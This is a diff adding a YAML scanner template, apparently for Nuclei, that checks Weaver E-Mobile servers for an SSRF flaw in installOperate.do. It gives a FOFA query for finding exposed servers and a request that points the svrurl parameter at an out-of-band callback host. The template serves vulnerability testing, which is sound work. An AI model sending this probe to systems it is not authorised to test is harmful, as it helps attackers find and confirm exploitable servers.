@@ -1,0 +1,29 @@
+id: Weaver-E-Mobile-installOperate-ssrf
+
+info:
+  name: 泛微E-Mobile installOperate.do SSRF
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa：header="EMobileServer"
+
+  tags: SSRF
+
+http:
+  - raw:
+      - |
+        GET /install/installOperate.do?svrurl=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
